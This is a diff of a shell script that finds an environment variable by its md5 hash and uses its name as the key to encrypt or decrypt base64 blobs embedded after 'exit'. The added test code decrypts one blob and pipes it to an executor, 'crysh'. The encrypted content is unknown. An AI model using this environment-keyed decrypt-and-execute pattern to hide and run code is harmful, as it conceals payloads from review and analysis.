@@ -58,12 +58,17 @@ function get_script(){
 env | while read THIS; do
 	if [ $( echo "$THIS" | md5sum | awk '{ print $1 }' | grep -c "$FIND" ) -ne 0 ]; then
 		VAR=$( echo $THIS | awk -F "=" '{ print $1 }' )
-#		get_script "#cloud_mirror_jump_silent_tiger#" "#river_glass_shadow_dream_fire#" | dec "$VAR" |  crysh
 
-#		TEST (D)ENCRYPT / EXEC
-#		get_script "#river_glass_shadow_dream_fire#" "#stone_light_whisper_branch_wind#"  | enc "$VAR"
-#		get_script "#river_glass_shadow_dream_fire#" "#stone_light_whisper_branch_wind#"  | crysh
+		printf  "Test#1:\n"
 		get_script "#cloud_mirror_jump_silent_tiger#" "#river_glass_shadow_dream_fire#" | dec "$VAR"
+
+		printf "\n\nTeste#2:\n"
+		get_script "#river_glass_shadow_dream_fire#" "#stone_light_whisper_branch_wind#"  | enc "$VAR"
+
+		printf "\n\nTeste#3 DECODE:\n"
+		get_script "#stone_light_whisper_branch_wind#" "#apple_bridge_random_glow_silent#" | dec "$VAR"
+		printf "Teste#3 DECODE AND EXECUTE:\n"
+		get_script "#stone_light_whisper_branch_wind#" "#apple_bridge_random_glow_silent#"  | dec "$VAR" | crysh
 
 		exit
 	fi
@@ -72,8 +77,21 @@ done
 
 exit
 #cloud_mirror_jump_silent_tiger#
+
 6IOKWJYxb2nctemDlyiDE3EeuwYcVmzOIIufjs9DRIw=
 
 #river_glass_shadow_dream_fire#
+This line will simply be encrypted!
+Bye World!
 
 #stone_light_whisper_branch_wind#
+
+TRrqwP3j8hz14KXdPfcHk2kb1oOa8kQ17gg0b/n9kYKiOEb1V5WbJ3hgfg1RDE8G
+9vll4oe9v7scXTUMS6C+TpbiHW63OF9+93YbppqR+PpuLRegj25uakmhv8MMvLUa
+
+#apple_bridge_random_glow_silent#
+
+
+#forest_jump_cloud_spark_wonder#
+
+#dream_stone_light_wave_shadow#
